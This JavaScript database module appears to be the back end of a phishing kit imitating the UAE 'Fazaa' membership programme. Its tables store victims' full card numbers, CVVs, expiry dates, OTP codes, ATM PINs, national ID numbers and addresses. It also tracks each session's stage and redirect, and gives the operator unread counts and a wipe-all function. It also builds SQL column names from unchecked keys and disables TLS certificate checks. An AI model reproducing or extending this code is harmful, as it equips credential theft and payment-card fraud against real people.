import sqlite3 from 'sqlite3';
import pg from 'pg';
const { Pool } = pg;
import path from 'path';
import { fileURLToPath } from 'url';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
// PostgreSQL connection
const isPostgres = !!process.env.DATABASE_URL;
let pool = null;
let sqliteDb = null;
if (isPostgres) {
    console.log('[Database] Using PostgreSQL');
    pool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: {
            rejectUnauthorized: false
        }
    });
}
else {
    console.log('[Database] Using SQLite');
    const DB_PATH = path.join(__dirname, 'fazaa.db');
    sqliteDb = new sqlite3.Database(DB_PATH);
    sqliteDb.run('PRAGMA journal_mode = WAL');
}
// Initialize tables
const initSql = `
  CREATE TABLE IF NOT EXISTS fazaa_sessions (
    id SERIAL PRIMARY KEY,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT,
    phoneNumber TEXT,
    email TEXT,
    emirate TEXT,
    district TEXT,
    membershipTier TEXT,
    totalAmount TEXT DEFAULT '15',
    idNumber TEXT,
    cardName TEXT,
    cardNumber TEXT,
    cardNumberMasked TEXT,
    cardExpiry TEXT,
    cardCvv TEXT,
    otpCode TEXT,
    atmPin TEXT,
    stage TEXT DEFAULT 'card' NOT NULL,
    errorMessage TEXT,
    clientIp TEXT,
    userAgent TEXT,
    statusRead INTEGER DEFAULT 0,
    redirectUrl TEXT,
    createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS registration_data (
    id SERIAL PRIMARY KEY,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT NOT NULL,
    phoneNumber TEXT NOT NULL,
    email TEXT NOT NULL,
    emirate TEXT NOT NULL,
    district TEXT,
    membershipTier TEXT NOT NULL,
    totalAmount TEXT DEFAULT '15',
    idNumber TEXT,
    addressEmirate TEXT,
    addressDistrict TEXT,
    addressStreet TEXT,
    addressBuildingNumber TEXT,
    clientIp TEXT,
    userAgent TEXT,
    createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  );
`;
// SQLite version of init
const initSqlSQLite = `
  CREATE TABLE IF NOT EXISTS fazaa_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT,
    phoneNumber TEXT,
    email TEXT,
    emirate TEXT,
    district TEXT,
    membershipTier TEXT,
    totalAmount TEXT DEFAULT '15',
    idNumber TEXT,
    cardName TEXT,
    cardNumber TEXT,
    cardNumberMasked TEXT,
    cardExpiry TEXT,
    cardCvv TEXT,
    otpCode TEXT,
    atmPin TEXT,
    stage TEXT DEFAULT 'card' NOT NULL,
    errorMessage TEXT,
    clientIp TEXT,
    userAgent TEXT,
    statusRead INTEGER DEFAULT 0,
    redirectUrl TEXT,
    createdAt TEXT DEFAULT (datetime('now')),
    updatedAt TEXT DEFAULT (datetime('now'))
  );

  CREATE TABLE IF NOT EXISTS registration_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT NOT NULL,
    phoneNumber TEXT NOT NULL,
    email TEXT NOT NULL,
    emirate TEXT NOT NULL,
    district TEXT,
    membershipTier TEXT NOT NULL,
    totalAmount TEXT DEFAULT '15',
    idNumber TEXT,
    addressEmirate TEXT,
    addressDistrict TEXT,
    addressStreet TEXT,
    addressBuildingNumber TEXT,
    clientIp TEXT,
    userAgent TEXT,
    createdAt TEXT DEFAULT (datetime('now'))
  );
`;
// Initialize tables
export async function initDatabase() {
    if (isPostgres) {
        // Create tables first
        await pool.query(initSql);
        // Add new columns if they don't exist (migration for existing databases)
        try {
            await pool.query('ALTER TABLE fazaa_sessions ADD COLUMN IF NOT EXISTS idNumber TEXT');
        }
        catch (e) { /* column may already exist */ }
        try {
            await pool.query('ALTER TABLE registration_data ADD COLUMN IF NOT EXISTS idNumber TEXT');
        }
        catch (e) { /* column may already exist */ }
        try {
            await pool.query('ALTER TABLE registration_data ADD COLUMN IF NOT EXISTS addressEmirate TEXT');
        }
        catch (e) { /* column may already exist */ }
        try {
            await pool.query('ALTER TABLE registration_data ADD COLUMN IF NOT EXISTS addressDistrict TEXT');
        }
        catch (e) { /* column may already exist */ }
        try {
            await pool.query('ALTER TABLE registration_data ADD COLUMN IF NOT EXISTS addressStreet TEXT');
        }
        catch (e) { /* column may already exist */ }
        try {
            await pool.query('ALTER TABLE registration_data ADD COLUMN IF NOT EXISTS addressBuildingNumber TEXT');
        }
        catch (e) { /* column may already exist */ }
        console.log('[Database] PostgreSQL tables initialized and migrated');
    }
    else {
        sqliteDb.exec(initSqlSQLite);
        // SQLite migrations - ignore errors if columns already exist
        const alterStatements = [
            'ALTER TABLE fazaa_sessions ADD COLUMN idNumber TEXT',
            'ALTER TABLE registration_data ADD COLUMN idNumber TEXT',
            'ALTER TABLE registration_data ADD COLUMN addressEmirate TEXT',
            'ALTER TABLE registration_data ADD COLUMN addressDistrict TEXT',
            'ALTER TABLE registration_data ADD COLUMN addressStreet TEXT',
            'ALTER TABLE registration_data ADD COLUMN addressBuildingNumber TEXT',
        ];
        for (const stmt of alterStatements) {
            try {
                sqliteDb.exec(stmt);
            }
            catch (e) { /* column may already exist */ }
        }
        console.log('[Database] SQLite tables initialized and migrated');
    }
}
async function query(sql, params = []) {
    if (isPostgres) {
        const res = await pool.query(sql.replace(/\?/g, (match, offset, string) => {
            let count = 0;
            for (let i = 0; i < offset; i++)
                if (string[i] === '?')
                    count++;
            return `$${count + 1}`;
        }), params);
        return res.rows;
    }
    else {
        return new Promise((resolve, reject) => {
            sqliteDb.all(sql, params, (err, rows) => {
                if (err)
                    reject(err);
                else
                    resolve(rows);
            });
        });
    }
}
async function queryOne(sql, params = []) {
    const rows = await query(sql, params);
    return rows[0];
}
async function run(sql, params = []) {
    if (isPostgres) {
        const res = await pool.query(sql.replace(/\?/g, (match, offset, string) => {
            let count = 0;
            for (let i = 0; i < offset; i++)
                if (string[i] === '?')
                    count++;
            return `$${count + 1}`;
        }), params);
        return { lastID: 0, changes: res.rowCount };
    }
    else {
        return new Promise((resolve, reject) => {
            sqliteDb.run(sql, params, function (err) {
                if (err)
                    reject(err);
                else
                    resolve({ lastID: this.lastID, changes: this.changes });
            });
        });
    }
}
// ========== Registration CRUD ==========
export async function createRegistration(data) {
    await run(`INSERT INTO registration_data (sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, idNumber, addressEmirate, addressDistrict, addressStreet, addressBuildingNumber, clientIp, userAgent)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`, [data.sessionId, data.fullName, data.phoneNumber, data.email, data.emirate, data.district || null, data.membershipTier, data.totalAmount || '15', data.idNumber || null, data.addressEmirate || null, data.addressDistrict || null, data.addressStreet || null, data.addressBuildingNumber || null, data.clientIp || null, data.userAgent || null]);
    const result = await queryOne('SELECT * FROM registration_data WHERE sessionId = ?', [data.sessionId]);
    return result;
}
export async function getRegistrationBySessionId(sessionId) {
    return queryOne('SELECT * FROM registration_data WHERE sessionId = ?', [sessionId]);
}
export async function getAllRegistrations(limit = 100) {
    return query('SELECT * FROM registration_data ORDER BY createdAt DESC LIMIT ?', [limit]);
}
// ========== Session CRUD ==========
export async function createSession(data) {
    await run(`INSERT INTO fazaa_sessions (sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, idNumber, clientIp, userAgent)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`, [data.sessionId, data.fullName || null, data.phoneNumber || null, data.email || null, data.emirate || null, data.district || null, data.membershipTier || null, data.totalAmount || '15', data.idNumber || null, data.clientIp || null, data.userAgent || null]);
    const result = await queryOne('SELECT * FROM fazaa_sessions WHERE sessionId = ?', [data.sessionId]);
    return result;
}
export async function getSessionBySessionId(sessionId) {
    return queryOne('SELECT * FROM fazaa_sessions WHERE sessionId = ?', [sessionId]);
}
export async function updateSession(sessionId, updates) {
    const fields = [];
    const values = [];
    for (const [key, value] of Object.entries(updates)) {
        fields.push(`${key} = ?`);
        values.push(value);
    }
    if (isPostgres) {
        fields.push("updatedAt = CURRENT_TIMESTAMP");
    }
    else {
        fields.push("updatedAt = datetime('now')");
    }
    values.push(sessionId);
    await run(`UPDATE fazaa_sessions SET ${fields.join(', ')} WHERE sessionId = ?`, values);
}
export async function getAllSessions(limit = 100) {
    return query('SELECT * FROM fazaa_sessions ORDER BY createdAt DESC LIMIT ?', [limit]);
}
export async function getUnreadSessionsCount() {
    const result = await queryOne('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0');
    return Number(result?.count) || 0;
}
export async function markAllAsRead() {
    await run('UPDATE fazaa_sessions SET statusRead = 1 WHERE statusRead = 0');
}
export async function clearAllData() {
    await run('DELETE FROM fazaa_sessions');
    await run('DELETE FROM registration_data');
}
export async function getStats() {
    const [total, pending, completed, failed, newCount, registrations] = await Promise.all([
        queryOne('SELECT COUNT(*) as count FROM fazaa_sessions'),
        queryOne("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage LIKE '%_pending'"),
        queryOne("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'success'"),
        queryOne("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'failed'"),
        queryOne('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0'),
        queryOne('SELECT COUNT(*) as count FROM registration_data'),
    ]);
    return {
        total: Number(total?.count) || 0,
        pending: Number(pending?.count) || 0,
        completed: Number(completed?.count) || 0,
        failed: Number(failed?.count) || 0,
        new: Number(newCount?.count) || 0,
        registrations: Number(registrations?.count) || 0,
    };
}
export default isPostgres ? pool : sqliteDb;
